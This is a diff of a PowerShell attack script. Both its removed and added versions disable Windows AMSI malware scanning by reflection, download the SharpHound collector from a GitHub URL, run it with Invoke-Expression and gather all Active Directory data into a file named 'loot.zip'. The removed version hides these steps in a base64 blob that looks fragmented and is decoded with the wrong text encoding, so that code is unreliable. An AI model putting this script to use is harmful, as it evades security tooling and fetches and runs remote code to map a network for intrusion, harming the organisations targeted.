@@ -1,19 +1,11 @@
-$base64 = @'
-WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAgAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQgBpAG4AZABpAG4AZwBGAGwAYQBnAHMAXQA6ADoATgBvAG4AUAB1AGIAbABpAGMAIAB8ACAAWwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBCAGkAbgBkAGkAbgBnAEYAbABhAGcAcwBdADoAOgBTAHQAYQB0AGkAYwApACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAgACQAdAByAHUAZQApADsAIABJAEUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAdQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIA
-AHUAcwBlAHIA
-AGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAFMAcABlAGMAdABlAHIA
-AE8AcABzAC8AQgBsAG8AbwBkAEgAbwB1AG4AZAAtAEwAZQBnAGEAYwB5AC8AbQBhAHMAdABlAHIALwBDAG8AbABsAGUAYwB0AG8AcgBzAC8AUwBoAGEAcgBwAEgAbwB1AG4AZAAuAHAAcwAxACcAKQA7ACAASQBuAHYAbwBrAGUALQBCAGwAbwBvAGQASABvAHUAbgBkACAALQBDAG8AbABsAGUAYwB0AGkAbwBuAE0AZQB0AGgAbwBkACA
-AQQBsAGwAIAAtAFoAaQBwAEYAaQBsAGUATgBhAG0AZQAgAGwAbwBvAHQALgB6AGkAcAA=
-'@
+$flags = [System.Reflection.BindingFlags] "NonPublic,Static"
+$amsiUtils = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
+$field = $amsiUtils.GetField("amsiInitFailed", $flags)
+$field.SetValue($null, $true)
 
-# Decode the base64 payload
-$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64))
+$sharphoundUrl = "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1"
+$sharphoundCode = Invoke-WebRequest -Uri $sharphoundUrl -UseBasicParsing | Select-Object -ExpandProperty Content
 
-# Bypass AMSI
-$flags = [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
-    GetField('amsiInitFailed', $flags).
-    SetValue($null, $true)
+Invoke-Expression $sharphoundCode
 
-# Execute decoded payload
-Invoke-Expression $decoded
+Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
